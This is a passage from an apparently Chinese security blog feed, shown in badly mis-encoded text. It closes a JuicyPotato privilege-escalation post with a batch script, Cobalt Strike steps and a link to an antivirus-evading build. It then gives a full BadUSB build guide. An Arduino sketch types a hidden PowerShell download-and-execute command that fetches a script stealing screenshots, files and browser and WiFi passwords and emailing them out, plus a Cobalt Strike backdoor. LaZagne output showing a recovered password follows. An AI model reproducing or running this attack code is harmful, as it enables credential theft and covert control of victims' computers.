‡æœºæ‰¹é‡éªŒè¯CLSIDææƒå¯ç”¨æ€§</h3><p>å®˜æ–¹ç»™å‡ºçš„æ‰¹å¤„ç†è„šæœ¬ç»è¿‡æµ‹è¯•åï¼Œé—®é¢˜éå¸¸å¤šï¼Œæœ¬äººåšäº†ä¸€ä¸‹ä¿®æ”¹</p><p>codeå¦‚ä¸‹â€“juicypotato.bat</p><pre><code class="shell">[url=home.php?mod=space&amp;uid=46675]@echo[/url] off:: Starting port, you can change itset /a port=10000SETLOCAL ENABLEDELAYEDEXPANSIONFOR /F %%i IN (CLSID.list) DO (   echo %%i !port!   juicypotato-webshell.exe -c %%i -p &quot;whoami&quot; &gt;&gt; result.log   set RET=!ERRORLEVEL!   :: echo !RET!   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1)</code></pre><p>æ‰§è¡Œååœ¨åŒç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªresult.logæ–‡ä»¶</p><p>è®°å½•æµ‹è¯•ä¸åŒCLSIDä½¿ç”¨çƒ‚åœŸè±†ææƒçš„ç»“æœ</p><p>æ•ˆæœå¦‚å›¾æ‰€ç¤º</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607196.png" alt="image"></p><p>éšåæ ¹æ®logçš„ç›¸å…³è¾“å‡ºï¼Œé€‰æ‹©åˆé€‚çš„CLSIDè¿›è¡Œæƒé™æå‡å³å¯</p><h3 id="0x08-åœ¨Cobaltstrikeä¸­ä½¿ç”¨Juicypotatoææƒ"><a href="#0x08-åœ¨Cobaltstrikeä¸­ä½¿ç”¨Juicypotatoææƒ" class="headerlink" title="0x08-åœ¨Cobaltstrikeä¸­ä½¿ç”¨Juicypotatoææƒ"></a>0x08-åœ¨Cobaltstrikeä¸­ä½¿ç”¨Juicypotatoææƒ</h3><p>åœ¨Cobaltstrikeä¸­ä½¿ç”¨Juicypotatoæå–ï¼Œæ˜¯ä½¿ç”¨DLLæ³¨å…¥çš„æ–¹å¼æ‰§è¡ŒJuicypotatoå®ç°æƒé™æå‡</p><p>ä½†æ˜¯ç¼ºé™·æ¯”è¾ƒæ˜æ˜¾ï¼Œåªèƒ½ä½¿ç”¨é»˜è®¤çš„CLSID({4991d34b-80a1-4291-83b6-3328366b9097})è¿›è¡Œææƒ,å¦‚æœæƒ³ä½¿ç”¨å…¶ä»–CLSIDè¯·å‚è€ƒå‘½ä»¤è¡Œç­‰æ‰§è¡Œæ–¹æ³•</p><p>ä¸‹è½½å¹¶è§£å‹reflectiveJuicyPotato.zipï¼Œåœ¨Cobaltstikeä¸­é€‰æ‹©è„šæœ¬ç®¡ç†å™¨â€“&gt;loadåŠ è½½juicypotato.cnaè„šæœ¬</p><p>éšåæˆ‘ä»¬åœ¨ææƒæ¨¡å—å³å¯å‘ç°å¤šäº†ä¸€ä¸ªJuicyPotato</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607449.png" alt="image"></p><p>ç‚¹å‡»å¼€å§‹åï¼Œææƒæ•ˆæœå¦‚å›¾</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607632.png" alt="image"></p><p>æƒé™æå‡è‡³NT AUTHORITY\SYSTEM</p><h3 id="0X09ç¦åˆ©-x2F-å®éªŒèµ„æºä¸‹è½½"><a href="#0X09ç¦åˆ©-x2F-å®éªŒèµ„æºä¸‹è½½" class="headerlink" title="0X09ç¦åˆ©&#x2F;å®éªŒèµ„æºä¸‹è½½"></a>0X09ç¦åˆ©&#x2F;å®éªŒèµ„æºä¸‹è½½</h3><p>æœ¬æ¬¡å®éªŒç¯å¢ƒä¸­çš„åŸç‰ˆJuicyPotatoï¼ŒJuicyPotato-webshellï¼ŒGet-CLSID.ps1,æ‰¹å¤„ç†æ–‡ä»¶ï¼ŒCobaltstrikeè„šæœ¬éƒ½å·²ç»ç»™å¤§å®¶é›†æˆå¥½äº†</p><p>å¬è¯´JuicyPotatoå·²ç»åŠ å…¥è±ªåå…¨å®¶æ¡¶ç³»åˆ—ï¼Ÿæ²¡äº‹ï¼Œå’±æœ‰å…æ€ç‰ˆæœ¬</p><p>æ‡‚Cçš„å…„å¼Ÿä¹Ÿå¯ä»¥è‡ªå·±ä¿®æ”¹ä¸€ä¸‹æºä»£ç ï¼Œå¾ˆå¥½è¿‡æ€è½¯çš„</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1ZVctJIZnV8yWNWqW1Byqaw">https://pan.baidu.com/s/1ZVctJIZnV8yWNWqW1Byqaw</a> </p><p>æå–ç ï¼šm78s</p><h3 id="0X10-Reference"><a href="#0X10-Reference" class="headerlink" title="0X10 Reference"></a>0X10 Reference</h3><p><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/">https://github.com/ohpe/juicy-potato/tree/master/CLSID/</a></p><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p><a href="https://3gstudent.github.io/">https://3gstudent.github.io</a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è®°Badusbçªƒå–å‡­æ®çš„è¯¦ç»†åˆ¶ä½œè¿‡ç¨‹</title>
      <link href="/2019/06/26/%E6%B5%85%E8%AE%B0Badusb%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B/"/>
      <url>/2019/06/26/%E6%B5%85%E8%AE%B0Badusb%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01-ç®€ä»‹"></a>0x01-ç®€ä»‹</h2><p>1.æ¦‚è¿°<br>åœ¨2014å¹´ç¾å›½é»‘å¸½å¤§ä¼šä¸Šï¼Œå®‰å…¨ç ”ç©¶äººå‘˜JakobLellå’Œç‹¬ç«‹å®‰å…¨ç ”ç©¶äººå‘˜Karsten Nohlå±•ç¤ºäº†ä»–ä»¬ç§°ä¸ºâ€œBadUSBâ€çš„æ”»å‡»æ–¹æ³•ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•è®©USBå®‰å…¨å’Œå‡ ä¹æ‰€æœ‰å’ŒUSBç›¸å…³çš„è®¾å¤‡(åŒ…æ‹¬å…·æœ‰USBç«¯å£çš„ç”µè„‘)éƒ½é™·å…¥ç›¸å½“å±é™©çš„çŠ¶æ€ã€‚<br><a href="https://imgchr.com/i/eACtFU"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450785.png" alt="eACtFU.png"></a></p><p>2.Badusbå†…éƒ¨ç»“æ„<br><a href="https://imgchr.com/i/eAC0yR"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450609.png" alt="eAC0yR.png"></a><br>ä»è¿™å¼ å›¾ä¾¿å¯ä»¥äº†è§£åˆ°â€“Badusbå’Œæ™®é€šçš„Uç›˜å¹¶æ²¡æœ‰ä»€ä¹ˆä¸¤æ ·ï¼Œå› æ­¤è¿·æƒ‘æ€§æé«˜ï¼Œå¾ˆå®¹æ˜“æ”»å‡»æˆåŠŸ</p><p>3.Badusb Hidæ”»å‡»åŸç†<br>HIDæ˜¯Human Interface Deviceçš„ç¼©å†™ï¼Œç”±å…¶åç§°å¯ä»¥äº†è§£HIDè®¾å¤‡æ˜¯ç›´æ¥ä¸äººäº¤äº’çš„è®¾å¤‡ï¼Œã€‚ä¸€èˆ¬æ¥è®²é’ˆå¯¹HIDçš„æ”»å‡»ä¸»è¦é›†ä¸­åœ¨é”®ç›˜é¼ æ ‡ä¸Šï¼Œå› ä¸ºåªè¦æ§åˆ¶äº†ç”¨æˆ·é”®ç›˜ï¼ŒåŸºæœ¬ä¸Šå°±ç­‰äºæ§åˆ¶äº†ç”¨æˆ·çš„ç”µè„‘ã€‚æ”»å‡»è€…ä¼šæŠŠæ”»å‡»éšè—åœ¨ä¸€ä¸ªæ­£å¸¸çš„é¼ æ ‡é”®ç›˜ä¸­ï¼Œå½“ç”¨æˆ·å°†å«æœ‰æ”»å‡»å‘é‡çš„é¼ æ ‡æˆ–é”®ç›˜ï¼Œæ’å…¥ç”µè„‘æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«åŠ è½½å¹¶æ‰§è¡Œã€‚ç®€è€Œè¨€ä¹‹ï¼Œä»Šå¤©è¦ä»‹ç»çš„Badusbåˆ©ç”¨çš„æ˜¯è™šæ‹Ÿé”®ç›˜æ¥å®ç°æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚</p><p>4.Badusbæ”»å‡»ä¼˜åŠ¿<br>æ”»å‡»è€…å°†æ¶æ„ä»£ç å­˜æ”¾äºBadusbçš„å›ºä»¶ä¸­ï¼ŒPCä¸Šçš„æ€æ¯’è½¯ä»¶æ— æ³•è®¿é—®åˆ°Uç›˜å­˜æ”¾å›ºä»¶çš„åŒºåŸŸï¼Œå› æ­¤ä¹Ÿå°±æ„å‘³ç€æ€æ¯’è½¯ä»¶æ— æ³•åº”å¯¹BadUSBçš„æ”»å‡»ã€‚</p><p>5.Teensy<br>æ”»å‡»è€…åœ¨å®šåˆ¶æ”»å‡»è®¾å¤‡æ—¶ï¼Œä¼šå‘USBè®¾å¤‡ä¸­ç½®å…¥ä¸€ä¸ªæ”»å‡»èŠ¯ç‰‡ï¼Œæ­¤æ”»å‡»èŠ¯ç‰‡æ˜¯ä¸€ä¸ªéå¸¸å°è€Œä¸”åŠŸèƒ½å®Œæ•´çš„å•ç‰‡æœºå¼€å‘ç³»ç»Ÿï¼Œå®ƒçš„åå­—å«TEENSYã€‚é€šè¿‡TEENSYä½ å¯ä»¥æ¨¡æ‹Ÿå‡ºä¸€ä¸ªé”®ç›˜å’Œé¼ æ ‡ï¼Œå½“ä½ æ’å…¥è¿™ä¸ªå®šåˆ¶çš„USBè®¾å¤‡æ—¶ï¼Œç”µè„‘ä¼šè¯†åˆ«ä¸ºä¸€ä¸ªé”®ç›˜ï¼Œåˆ©ç”¨è®¾å¤‡ä¸­çš„å¾®å¤„ç†å™¨ä¸å­˜å‚¨ç©ºé—´å’Œç¼–ç¨‹è¿›å»çš„æ”»å‡»ä»£ç ï¼Œå°±å¯ä»¥å‘ä¸»æœºå‘é€æ§åˆ¶å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ä¸»æœºï¼Œæ— è®ºè‡ªåŠ¨æ’­æ”¾æ˜¯å¦å¼€å¯ï¼Œéƒ½å¯ä»¥æˆåŠŸã€‚<br><a href="https://imgchr.com/i/eACUW4"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450242.png" alt="eACUW4.png"></a></p><p>6.Arduino<br>Arduinoæ˜¯ä¸€æ¬¾ä¾¿æ·çµæ´»ã€æ–¹ä¾¿ä¸Šæ‰‹çš„å¼€æºç”µå­åŸå‹å¹³å°ã€‚å…¶å¼€å‘ç¯å¢ƒï¼Œä¸»è¦åŒ…å«ä¸¤ä¸ªä¸»è¦çš„éƒ¨åˆ†ï¼šç¡¬ä»¶éƒ¨åˆ†æ˜¯å¯ä»¥ç”¨æ¥åšç”µè·¯è¿æ¥çš„Arduinoç”µè·¯æ¿ï¼›å¦å¤–ä¸€ä¸ªåˆ™æ˜¯Arduino IDEï¼Œä½ çš„è®¡ç®—æœºä¸­çš„ç¨‹åºå¼€å‘ç¯å¢ƒã€‚ä½ åªè¦åœ¨IDEä¸­ç¼–å†™ç¨‹åºä»£ç ï¼Œå°†ç¨‹åºä¸Šä¼ åˆ°Arduinoç”µè·¯æ¿åï¼Œç¨‹åºä¾¿ä¼šå‘Šè¯‰Arduinoç”µè·¯æ¿è¦åšäº›ä»€ä¹ˆäº†ã€‚<br><a href="https://imgchr.com/i/eACdSJ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450221.png" alt="eACdSJ.png"></a></p><p>7.æ”»å‡»æµç¨‹<br>Bad-Usbæ’å…¥åï¼Œä¼šæ¨¡æ‹Ÿé”®ç›˜å¯¹ç”µè„‘è¿›è¡Œæ“ä½œï¼Œé€šè¿‡è¿™äº›æ“ä½œæ‰“å¼€ç”µè„‘çš„å‘½ä»¤ç»ˆç«¯ï¼Œå¹¶æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œè¿™æ¡å‘½ä»¤å°†ä»æŒ‡å®šç½‘å€ä¸‹è½½æ¶æ„ä»£ç (é€šå¸¸ä¸ºpowershellè„šæœ¬)å¹¶äºåå°é™é»˜è¿è¡Œã€‚è¿™äº›ä»£ç åŠŸèƒ½åŒ…æ‹¬ï¼šçªƒå–ä¿¡æ¯ã€åå¼¹shellã€å‘é€é‚®ä»¶ç­‰ï¼Œä»è€Œå®ç°æ§åˆ¶ç›®æ ‡æœºæˆ–è€…çªƒå–ä¿¡æ¯çš„ç›®çš„ã€‚</p><h2 id="0x02-å‡†å¤‡å·¥ä½œ"><a href="#0x02-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x02-å‡†å¤‡å·¥ä½œ"></a>0x02-å‡†å¤‡å·¥ä½œ</h2><p>1.ç¡¬ä»¶<br>æˆ‘åœ¨è¿™è¾¹é€‰æ‹©çš„æ˜¯BS Micro pro micro leonardo Arduino å¼€å‘æ¿ï¼Œç»“æ„æ˜¯ä¸€ä¸ªUSBä¸»æ§åŠ ä¸€å—åˆ°ä¸¤å—çš„å­˜å‚¨é¢—ç²’ã€‚ä»åŸç†æ¥çœ‹ã€‚USBä¸»æ§å°±æ˜¯ä¸€ä¸ªå¸¦åŸç”Ÿusbæ¥å£çš„å•ç‰‡æœºã€‚<br>è™½ç„¶å®ƒçš„ä½“ç§¯å°ï¼Œä½†å®ƒæ‹¥æœ‰ä¸°å¯Œæ¥å£ï¼Œä½¿å…¶ä¸ä»…æœ‰ä¼ ç»Ÿæ§åˆ¶å™¨çš„åŠŸèƒ½ï¼Œè¿˜æœ‰åœ¨ç”µè„‘ä¸Šå®ç°é¼ æ ‡ã€é”®ç›˜çš„åŠŸèƒ½ï¼Œä¸²å£åŠŸèƒ½ï¼Œå¹¶ä¸”æ— éœ€é©±åŠ¨ï¼Œèƒ½ç›´æ¥å®ç°ä¸ç”µè„‘çš„é€šä¿¡ã€‚<br>    å®ƒä¸å…¶ä»–å¤§å¤šæ•°çš„MCUæ§åˆ¶æ¿ä¸€ä¸ªå¾ˆå¤§çš„åŒºåˆ«æ˜¯ç¼–ç¨‹ä¸éœ€è¦é¢å¤–ä½¿ç”¨ç¼–ç¨‹å™¨ï¼Œç›´æ¥ç”¨USBå°±å¯ä»¥ç¼–ç¨‹ã€‚è¿™æ ·ä¸ä»…æ–¹ä¾¿ã€ç¨³å®šã€å¯é ï¼Œè¿˜çœä¸‹äº†ä¸€ä¸ªç¼–ç¨‹å™¨çš„é’±ã€‚ </p><p>æ·˜å®é“¾æ¥:<br><a href="https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&id=589099911512&_u=m2i3k6cqf473">https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473</a></p><p>å®é™…åˆ°è´§è®¾å¤‡å¦‚å›¾<br><a href="https://imgchr.com/i/eACBO1"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451688.png" alt="eACBO1.png"></a></p><p>2.å¼€å‘ç¯å¢ƒå®‰è£…<br>Arduino IDE<br><a href="https://imgchr.com/i/eACyTK"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451614.png" alt="eACyTK.png"></a><br>kaliä¸‹å·²é›†æˆï¼Œwindowsä¸‹è½½é“¾æ¥ï¼š<br><a href="http://downloads.arduino.cc/arduino-1.6.4-windows.zip">http://downloads.arduino.cc/arduino-1.6.4-windows.zip</a><br>ä¸‹è½½ä¸ºzipæ–‡ä»¶ï¼Œæ— éœ€å®‰è£…ï¼Œç›´æ¥è§£å‹å°±èƒ½ç”¨ã€‚<br>æ³¨æ„ï¼šä¸è¦ä¸‹è½½é«˜äº1.6.4çš„ç‰ˆæœ¬ï¼Œå¦åˆ™è®¾å¤‡é©±åŠ¨æ— æ³•æ­£å¸¸å®‰è£…ï¼ï¼ˆæˆ‘è¢«è¿™ä¸ªå‘ä¹å¥½ä¸€æ®µæ—¶é—´ï¼‰</p><p>3.é©±åŠ¨å‡†å¤‡<br>ä¸ºäº†å¯ä»¥æ­£å¸¸ä½¿ç”¨ardunioå¯¹å¼€å‘ç‰ˆè¿›è¡Œç¼–ç¨‹ï¼Œéœ€å®‰è£…Teensyduinoé©±åŠ¨<br>ä¸‹è½½é“¾æ¥<a href="http://www.pjrc.com/teensy/td_123/teensyduino.exe">http://www.pjrc.com/teensy/td_123/teensyduino.exe</a><br><a href="https://imgchr.com/i/eACsw6"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451655.png" alt="eACsw6.png"></a><br>ä¸€è·¯Nextä¸‹æ¥ï¼Œæœ¬å¤„é€‰æ‹©åˆšåˆšè§£å‹çš„ardunio1.64è·¯å¾„æ‰å¯ä»¥æ­£å¸¸å®‰è£…<br><a href="https://imgchr.com/i/eACWSH"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451046.png" alt="eACWSH.png"></a><br>é€‰æ‹©allè¿›è¡Œå®‰è£…<br><a href="https://imgchr.com/i/eACcFO"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451875.png" alt="eACcFO.png"></a></p><p>4.å¼€å¯smtpæœåŠ¡<br>ä¸ºç¡®ä¿æˆ‘ä»¬çš„è„šæœ¬èƒ½å¤Ÿå®Œç¾åœ°å‘é€åŒ…å«ç›®æ ‡ä¸»æœºä¿¡æ¯çš„é‚®ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å¼€å¯smtpé‚®ç®±æœåŠ¡ã€‚æœ¬å¤„æˆ‘ä½¿ç”¨çš„æ˜¯QQé‚®ç®±ï¼Œå¼€å¯æ–¹æ³•å¦‚ä¸‹ï¼š<br>è¿›å…¥é‚®ç®±ï¼Œç‚¹å‡»è®¾ç½®-è´¦æˆ·<br><a href="https://imgchr.com/i/eACgYD"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452562.png" alt="eACgYD.png"></a></p><p>å‘ä¸‹æ‹‰å³å¯çœ‹åˆ°<br><a href="https://imgchr.com/i/eAC2fe"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452333.png" alt="eAC2fe.png"></a><br>å°†å¤´ä¸¤ä¸ªæœåŠ¡å¼€å¯ï¼Œæ­¤è¿‡ç¨‹éœ€è¦éªŒè¯å¯†ä¿~<br>å³å¯è·å¾—â€œæˆæƒç â€ï¼ˆå³åæ–‡æåˆ°çš„é‚®ç®±å¯†ç ï¼‰æ­¤å¤„çš„é‚®ç®±å¯†ç å¹¶ä¸æ˜¯æŒ‡QQå¯†ç <br><a href="https://imgchr.com/i/eACfld"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453721.png" alt="eACfld.png"></a></p><p>5.æœåŠ¡å™¨ç«¯å‡†å¤‡<br>â‘ é¦–å…ˆä¸‹è½½Badusbæ‰€éœ€ä»£ç ï¼Œä»£ç å·²æ‰“åŒ…ï¼Œè§æ–‡æœ«<br>â‘¡ä¿®æ”¹å‹ç¼©åŒ…ä¸­çš„main.ps1çš„2754è¡Œï¼ŒæŠŠæ‰“ç çš„åœ°æ–¹æ”¹ä¸ºè‡ªå·±çš„æœåŠ¡å™¨IP<br><a href="https://imgchr.com/i/eACQQs"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453507.png" alt="eACQQs.png"></a></p><p>â‘¢ä¿®æ”¹main.ps1çš„2903-2919è¡Œ ä¸ºå‘é€é‚®ä»¶é…ç½®<br><a href="https://imgchr.com/i/eACKzj"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453845.png" alt="eACKzj.png"></a></p><p>â‘£ä¿®æ”¹GetPass.ps1ä¸­çš„å‰ä¸¤è¡Œï¼ŒåŸŸåï¼ŒGetpass.rarå®é™…ä¸Šæ˜¯lazagneï¼Œç”¨rarä¸‹è½½å°½é‡é¿å…å‡ºå‘å®‰å…¨è½¯ä»¶ï¼Œè¿™ä¸ªä¸æ”¾å¿ƒå¯ä»¥ç™¾åº¦ä¸‹è½½ã€‚command.rarå®ä¸ºbat å› ä¸º lazagneæ³¨å…¥lsassæ—¶ä¼šè¢«å®‰å…¨è½¯ä»¶æ‹¦æˆªï¼Œæ‰€ä»¥ç”¨baté¿å…æ³¨å…¥ã€‚ä¿®æ”¹GetPass.ps1ä¸­çš„é‚®ç®±é…ç½®ï¼ŒåŒmain.ps1ä¸­çš„å°±è¡Œ<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453746.png" alt="eAi9KA.png"><br>â‘¤å°†ä¿®æ”¹åçš„å…¨éƒ¨æ–‡ä»¶ç”¨HFSï¼ˆä¸€ä¸ªç®€å•çš„æä¾›httpä¸‹è½½è½¯ä»¶ï¼‰ä¸Šä¼ åˆ°å…¬ç½‘æœåŠ¡å™¨<br>HFSé“¾æ¥ï¼š<a href="http://www.ouyaoxiazai.com/soft/stgj/133/21762.html">http://www.ouyaoxiazai.com/soft/stgj/133/21762.html</a><br><a href="https://imgchr.com/i/eACFsI"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453712.png" alt="eACFsI.png"></a></p><h2 id="0x03-Badusbåˆ¶ä½œ"><a href="#0x03-Badusbåˆ¶ä½œ" class="headerlink" title="0x03-Badusbåˆ¶ä½œ"></a>0x03-Badusbåˆ¶ä½œ</h2><p>1.å°†ç¡¬ä»¶æ’å…¥ç”µè„‘<br><a href="https://imgchr.com/i/eACCzd"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453770.png" alt="eACCzd.png"></a></p><p>2.æ‰“å¼€Arduino IDE<br>3.å·¥å…·-&gt;ç‰ˆ-&gt;é€‰æ‹©â€œArduino Leonardoâ€<br><a href="https://imgchr.com/i/eACiQA"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453681.png" alt="eACiQA.png"></a></p><p>4.è¾“å…¥Windows +R è¾“å…¥å‘½ä»¤devmgmt.mscæ‰“å¼€è®¾å¤‡ç®¡ç†å™¨<br>æŸ¥çœ‹ä¸²å£ä¿¡æ¯<br><a href="https://imgchr.com/i/eACVdf"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453575.png" alt="eACVdf.png"></a><br>5.æ ¹æ®ä¹‹å‰çš„ä¸²å£ä¿¡æ¯ï¼Œæ‰“å¼€ardunio ideé€‰æ‹©â€“å·¥å…·-&gt;ç«¯å£-&gt;é€‰æ‹©â€œCOM* (Arduino Leonardo)â€<br>6.ç°åœ¨å¯ä»¥çœ‹åˆ°IDEå³ä¸‹è§’å‡ºç°â€œArduino Leonardo on COM*â€<br><a href="https://imgchr.com/i/eACkLt"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453630.png" alt="eACkLt.png"></a><br>6.ä¸‹é¢è¿›è¡Œå°†ä»£ç å†™å…¥ç¡¬ä»¶çš„æ“ä½œ<br>â‘ å¤åˆ¶å¦‚ä¸‹ä»£ç åˆ°ardunioä¸­</p><pre><code>void setup()&#123;//åˆå§‹åŒ– Keyboard.begin();//å¼€å§‹é”®ç›˜é€šè®¯ delay(5000);//å»¶æ—¶ Keyboard.press(KEY_LEFT_GUI);//winé”® delay(500);Keyboard.press(&#39;r&#39;);//ré”®delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.press(KEY_CAPS_LOCK);//åˆ©ç”¨å¼€å¤§å†™è¾“å°å†™ç»•è¿‡è¾“å…¥æ³•Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/main.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//ç»“æŸé”®ç›˜é€šè®¯ Keyboard.begin();//å¼€å§‹é”®ç›˜é€šè®¯ delay(5000);//å»¶æ—¶ Keyboard.press(KEY_LEFT_GUI);//winé”® delay(500);Keyboard.press(&#39;r&#39;);//ré”®delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/payload.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//ç»“æŸé”®ç›˜é€šè®¯ &#125;void loop() &#123;&#125;</code></pre><p>è¯·å„ä½å°†8.8.8.8æ”¹æˆè‡ªå·±çš„æœåŠ¡å™¨ip~<br>æ³¨é‡Šå†™çš„åº”è¯¥éƒ½å¾ˆæ˜ç™½äº†ï¼Œå°ä¼™ä¼´ä»¬å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚ä¿®æ”¹</p><p>PS:æˆ‘è¿™è¾¹é€‰æ‹©æ‰§è¡Œä¸¤ä¸ªpayloadï¼Œç¬¬ä¸€ä¸ªæ˜¯æˆ‘ä¹‹å‰æ•™å¤§å®¶ä¿®æ”¹ä¸Šä¼ çš„main.ps1ï¼Œè¿™ä¸ªè„šæœ¬å®ç°çš„æ˜¯â€œæˆªå›¾ã€ç”¨æˆ·å‡­æ®å¯¼å‡ºï¼Œæ–‡ä»¶çªƒå–ï¼Œè®¡ç®—æœºä¸­æµè§ˆå™¨&#x2F;WIFIç­‰å¯†ç çš„è¯»å–â€å¹¶å°†å…¶é€šè¿‡é‚®ç®±å‘é€åˆ°æˆ‘ä»¬æ‰‹ä¸­ã€‚</p><p>ç¬¬äºŒä¸ªPayloadæ˜¯æˆ‘åœ¨cobaltstrikeé‡Œé¢ç”Ÿæˆçš„powershellä¸€å¥è¯åé—¨<br><a href="https://imgchr.com/i/eACEeP"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454216.png" alt="eACEeP.png"></a></p><p>ä»£ç å¤§ä½“çš„æ„æ€æ˜¯ï¼š<br>æ’å…¥BADusbåç­‰å¾…äº”ç§’ï¼Œ<br>åˆ‡æ¢å¤§å†™ç»•å¼€è¾“å…¥æ³•<br>æŒ‰ä¸‹Windows+Ræ‰“å¼€cmd<br>æ¨¡æ‹Ÿè¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶å›è½¦æ‰§è¡Œ</p><p>å½“ä½ å°†ä»£ç å†™å…¥å®Œæˆåï¼Œæ­å–œä½ ï¼ŒBadusbå·²åˆ¶ä½œæˆåŠŸ<br><a href="https://imgchr.com/i/eACZo8"><img src="https://s2.ax1x.com/2019/07/23/eACZo8.png" alt="eACZo8.png"></a></p><h2 id="0x004æµ‹è¯•"><a href="#0x004æµ‹è¯•" class="headerlink" title="0x004æµ‹è¯•"></a>0x004æµ‹è¯•</h2><p>å°†Badusbæ’å…¥ç”µè„‘ï¼ŒçŸ­æš‚å‡ ç§’å»¶æ—¶åï¼Œå‘ç°æ‰“å¼€äº†cmdçª—å£ï¼Œè¾“å…¥äº†æˆ‘ä»¬ä¸‹è½½æ‰§è¡Œpowershellçš„å‘½ä»¤ï¼Œå¹¶å›è½¦æ‰§è¡Œ<br><a href="https://imgchr.com/i/eACnJg"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454260.png" alt="eACnJg.png"></a><br>è¿‡äº†å‡ åˆ†é’Ÿï¼Œä¼šæ¥ä¸¤å°é‚®ä»¶<br><a href="https://imgchr.com/i/eACmFS"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454768.png" alt="eACmFS.png"></a><br><a href="https://imgchr.com/i/eAiHzQ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454150.png" alt="eAiHzQ.png"></a><br>è¿™é‡Œé¢ä¾¿æ˜¯æˆ‘ä»¬å¿ƒå¿ƒå¿µå¿µçš„Badusbæ‰§è¡Œç»“æœ<br>Report.zipå†…å®¹å¦‚å›¾<br><a href="https://imgchr.com/i/eAiLss"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454104.png" alt="eAiLss.png"></a></p><p>Getpass txtå†…å®¹å¦‚ä¸‹</p><pre><code>|==========================                                                                       |                                                                |                        The LaZagne Project                       |                                                                   |                                                                   |==========================########## User: Administrator ##########------------------- Chrome passwords -----------------Password found !!!URL: http://127.0.0.1/loginLogin: adminPassword: xunfeng321Password found 